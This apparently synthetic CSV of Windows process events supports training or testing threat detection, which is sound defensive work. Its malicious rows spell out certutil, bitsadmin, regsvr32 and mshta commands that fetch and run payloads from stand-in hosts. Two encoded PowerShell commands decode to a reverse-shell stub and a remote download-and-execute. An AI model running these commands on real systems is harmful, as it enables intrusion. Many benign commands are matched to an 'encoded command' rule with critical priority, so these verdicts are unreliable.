UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-04T03:57:21.800Z,{1649896C-8673-4C29-9F6D-83185C8D2106},25727,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name W3SVC -Force""",C:\Windows\System32\cmd.exe,cmd.exe,32144,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,71,4.5466,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,3,1,0,57,1.3846,1.3752272228591065,1.0687625109074974,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,76.02858568748604,15,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours, +5 suspicious flags]",False,ALERT,CRITICAL,97.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 76 | Chain Risk: 15
2024-07-03T03:37:01.783Z,{6EA1A1F9-9DC0-49AE-A8F1-3FCBE52C6BD5},59415,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\runtime329.csproj,C:\Windows\System32\cmd.exe,powershell.exe,41970,CORP\jsmith,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,85,4.9569,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,3,1,0,37,3.9031,1.93654445667915,1.683131958160322,0,9,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.27008386260806,75,cmd.exe → msbuild.exe: Command shell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.1,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 81 | Chain Risk: 75
2024-07-04T16:18:40.729Z,{8882B440-075F-4225-AC61-F599CC85EFF8},33836,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,51273,CORP\admin,High,0,,,benign,0,3,1,1,98,4.7762,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,16,0,0,18,1.231,2.4577676023691906,1.4125578438084203,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,42.33634872281806,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-03T18:02:04.072Z,{2F59BDF8-58B2-44A5-8E7E-2C6DC1553BDB},38443,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://darkops6442.org/downloads/core504.exe C:\Users\Public\svc148.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,48680,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious,4,8,1,0,101,4.8671,1,1,0,0,6,0.1667,0,1,2,0,0,1,2657444117,18,0,0,2,3.9031,2.5780498667591996,1.548668452522243,0,9,1,True,Certutil URL Cache Download,high,attack.t1105,88.60139432692213,85,"powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 85
2024-07-02T01:31:37.994Z,{679F07F7-35EF-4DD6-AFE0-16296AC8716F},25759,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job6474 /download /priority high http://c2-server8062.io/helper320.exe C:\Users\Public\loader783.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,41431,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,124,4.9001,1,1,0,0,8,0.125,0,1,2,0,0,1,1514001697,1,1,0,31,3.9031,3.500213893749271,1.5980815447945884,0,6,1,True,BITSAdmin File Download,high,attack.t1197,90.43525933323386,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 90
2024-07-04T02:05:20.056Z,{49E37D58-CE33-4620-B16E-970DDEE0B4A5},40855,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Windows\System32\cmd.exe,cmd.exe,43029,CORP\jsmith,Medium,1,T1059.001,PowerShell Encoded Command,malicious,1,3,1,1,223,4.5333,1,0,0,1,6,0.5,1,0,2,0,0,1,4082297620,2,1,0,5,1.3846,7.46952861861958,1.0488475373553097,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,100.0,25,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours, +10 encoded command, +5 suspicious flags]",False,ALERT,CRITICAL,100.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 100 | Chain Risk: 25
2024-07-04T11:28:51.298Z,{1B816D35-F846-45B8-83FD-55B379410852},55478,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,46405,CORP\agarwal,Medium,0,,,benign,0,3,1,1,113,4.793,1,0,0,0,5,0.2,0,0,1,0,0,0,945137867,11,0,0,28,1.231,3.059178924319237,1.4377135998743413,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,65.88938948489678,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,96.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 66 | Chain Risk: 5
2024-07-02T10:40:42.442Z,{DDB69EF6-6B57-4346-9E3E-1BB1EE335479},26924,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,2913,CORP\sysadmin,High,0,,,benign,1,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,10,0,0,40,1.3846,2.0167326329391564,1.2315262421197382,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,47.514132511649244,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 48 | Chain Risk: 5
2024-07-05T12:44:59.898Z,{65708679-D01F-4F97-9CF2-1084E03D43F0},25187,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,30798,CORP\admin,High,0,,,benign,1,3,1,1,113,4.793,1,0,0,0,5,0.2,0,0,2,0,0,1,4082297620,12,0,0,44,1.3846,3.059178924319237,1.4377135998743413,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,74.47907643850485,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,97.4,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 74 | Chain Risk: 5
2024-07-04T15:41:13.908Z,{2D764E9B-8DDE-436B-9931-FEFB5983A03F},36679,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,41918,CORP\itops,High,0,,,gray_area,1,19,1,0,76,4.7663,0,0,0,0,5,0.0,0,0,2,0,0,1,2398546659,15,0,0,41,3.9031,1.575697663509122,1.3977339161267168,0,5,2,False,None,none,,72.76097797739784,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,ALERT,MEDIUM,51.8,"ANOMALY SCORE: 73/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-04T08:10:18.743Z,{A3BC98D7-85E1-4E6E-BF2E-F01582C65F55},13596,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://fileserver.corp.local/package29.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,31752,CORP\itops,High,0,,,gray_area,1,12,0,0,75,4.3379,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,8,0,0,10,3.9031,1.5356035753791188,0.7562621364457279,0,5,2,False,None,none,,72.08719786051623,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,51.4,"ANOMALY SCORE: 72/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T03:50:09.145Z,{8D1D08D8-D838-464F-9A3B-702C735932E5},52366,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -File C:\Scripts\nightly-backup.ps1,C:\Windows\System32\cmd.exe,cmd.exe,39641,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,50,4.5815,0,0,0,0,3,0.0,0,0,2,0,0,1,4082297620,3,1,0,50,1.3846,0.5332513721290413,1.121020599401584,0,10,2,False,None,none,,73.52373309407514,10,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,ALERT,MEDIUM,52.3,"ANOMALY SCORE: 74/100 | Unusual factors: spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); execution during off-hours (midnight-5am): 1.00 (baseline: 0.10±0.30, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-02T16:20:25.600Z,{626878E6-19AA-43FF-BA5F-4B0A7DE7F507},42569,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,51018,CORP\admin,High,0,,,benign,0,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,16,0,0,20,1.231,1.976638544809153,0.836221503940977,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.70833269246652,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-02T03:12:21.130Z,{75BEEF3A-A526-4A89-9E77-901B6245A956},3103,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://c2-server3551.ru/payloads/file183.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,46364,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,76,4.621,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,3,1,0,12,3.9031,1.575697663509122,1.1801665734851492,0,0,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,89.99728757878242,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-03T22:25:29.791Z,{857B7F7B-C0C6-4F79-9087-76CCD24C60EB},45255,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://apt-infra682.net/module653.exe C:\Users\Public\patch980.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,50092,CORP\mjones,Medium,1,T1105,Certutil Download,malicious,4,8,1,0,92,4.7562,1,1,0,0,5,0.2,0,1,2,0,0,1,2657444117,22,0,0,25,3.9031,2.2172030735891717,1.3826105151585135,0,0,1,True,Certutil URL Cache Download,high,attack.t1105,88.87584051216719,85,"powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 85
2024-07-03T11:48:53.692Z,{CC655414-A515-4414-99BC-BC6A7FD2D619},26736,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,33077,CORP\sysadmin,High,0,,,benign,0,3,1,1,76,4.5494,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,11,0,0,48,1.231,1.575697663509122,1.072955136918485,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.18030955432188,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-03T02:59:37.041Z,{FAACEF10-76D7-4DB0-9DA5-94DB46F280B5},9740,C:\Windows\System32\mshta.exe,mshta.exe http://loader-cdn756.org/script344.hta,C:\Windows\explorer.exe,cmd.exe,7551,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious,0,5,1,1,48,4.4987,0,1,0,0,2,0.0,0,0,1,0,0,0,333442925,2,1,0,59,3.9031,0.453063195869035,0.9970386587909732,0,6,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,85.59801966653376,65,"explorer.exe → mshta.exe: Explorer launching HTA handler [Modifiers: +15 URL in command, +10 off-hours]",True,ALERT,CRITICAL,98.6,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 86 | Chain Risk: 65
2024-07-06T01:59:34.180Z,{287085F1-5E32-4F46-95BC-86C8855E1795},11357,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://evil-payload5976.top/payloads/file215.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,52478,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,80,4.6906,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,1,1,1,59,3.9031,1.7360740160291346,1.2843832771868215,0,0,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,90.27947376274271,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-07T01:19:28.895Z,{8F835CBE-9AD8-4516-8DEB-D8EB747AB16A},37767,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAJwApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,6740,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,222,4.6311,1,0,0,1,8,0.375,1,0,2,1,0,0,3072976960,1,1,1,19,3.9031,7.429434530489576,1.1952899744533512,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-03T08:30:06.302Z,{8D647FA9-4CAD-4DCA-8228-3ED4A738BA25},28261,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,61329,CORP\agarwal,Medium,0,,,benign,0,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,8,0,0,30,1.231,2.5780498667591996,1.4642169857295075,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.9431868118657,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-05T12:14:52.938Z,{5916B510-4E3D-43D0-B564-0EEEA523116D},48940,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38755,CORP\mjones,Medium,0,,,benign,0,4,1,1,23,3.4473,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,12,0,0,14,0.9208,-0.5492890073810427,-0.577292408334592,0,0,1,False,None,none,,74.03312111157413,0,explorer.exe → cmd.exe: No known suspicious pattern,False,ALERT,MEDIUM,52.7,"ANOMALY SCORE: 74/100 | Unusual factors: IP address in command line: 1.00 (baseline: 0.01±0.11, z=8.9)"
2024-07-01T17:37:16.247Z,{D07DA830-2823-4178-BFC7-C678CFF09279},55540,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb1392951.cab C:\Windows\SoftwareDistribution\Download\update_kb1392951.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,51735,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.847,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,17,0,0,37,3.9031,5.625200564639437,1.5185713872290882,1,2,3,True,BITSAdmin File Download,high,attack.t1197,92.44791338740812,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.2,Sigma rule matched: BITSAdmin File Download | ML Score: 92 | Chain Risk: 30
2024-07-05T12:04:06.570Z,{8173D13D-92F1-4E45-B56D-032DE82BCE0A},4850,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded7782.txt C:\Users\Public\decoded2282.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,4415,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious,4,8,1,0,80,4.3313,1,0,0,0,4,0.25,0,0,2,0,0,1,2657444117,12,0,0,4,3.9031,1.7360740160291346,0.746379517991258,0,6,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,88.39791968583593,65,powershell.exe → certutil.exe: PowerShell invoking certutil,True,ALERT,CRITICAL,98.8,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 88 | Chain Risk: 65
2024-07-04T02:43:41.469Z,{FBECBB97-9C42-4A92-8BDF-570B742BB35F},6618,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded6953.txt C:\Users\Public\decoded3055.exe,C:\Windows\System32\cmd.exe,powershell.exe,1676,CORP\mjones,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,80,4.3968,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,2,1,0,43,3.9031,1.7360740160291346,0.8444570193197007,0,0,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,94.81039391767884,60,cmd.exe → certutil.exe: Command shell invoking certutil [Modifiers: +10 off-hours],True,ALERT,CRITICAL,99.5,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 95 | Chain Risk: 60
2024-07-04T03:09:45.435Z,{4E9797D4-DE85-4C19-8B38-E5865C5A9DAE},55292,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb7061063.cab C:\Windows\SoftwareDistribution\Download\update_kb7061063.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,28004,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.847,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,3,1,0,9,3.9031,5.625200564639437,1.5185713872290882,1,2,3,True,BITSAdmin File Download,high,attack.t1197,92.22430701428803,40,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +10 off-hours, +5 suspicious flags]",False,ALERT,CRITICAL,99.2,Sigma rule matched: BITSAdmin File Download | ML Score: 92 | Chain Risk: 40
2024-07-05T03:19:25.056Z,{6173EC51-F36C-40D9-84DD-3FF838C94038},42436,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://stager7154.io/sys800.exe C:\Users\Public\svc554.exe,C:\Windows\System32\cmd.exe,powershell.exe,63837,CORP\klee,Medium,1,T1105,Certutil Download,malicious,1,8,1,0,91,4.7042,1,1,0,0,6,0.1667,0,1,2,0,0,1,1473216238,3,1,0,19,3.9031,2.1771089854591685,1.3047474606687581,0,6,1,True,Certutil URL Cache Download,high,attack.t1105,89.4065360430324,80,"cmd.exe → certutil.exe: Command shell invoking certutil [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 80
2024-07-01T20:07:28.305Z,{539B9A30-9541-42B5-B85B-E69C82A58A0A},38515,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb3077237.cab C:\Windows\SoftwareDistribution\Download\update_kb3077237.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,49290,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,170,4.8565,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,20,0,0,7,3.9031,5.3445419477294145,1.5327963683377923,1,2,3,True,BITSAdmin File Download,high,attack.t1197,93.04751507810526,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.3,Sigma rule matched: BITSAdmin File Download | ML Score: 93 | Chain Risk: 30
2024-07-02T08:59:26.024Z,{7CE71419-FEDA-4C3F-A81A-62E91F4FB3D6},16269,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,36490,CORP\agarwal,Medium,0,,,benign,0,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,8,0,0,59,1.231,2.5780498667591996,1.4642169857295075,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.9431868118657,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
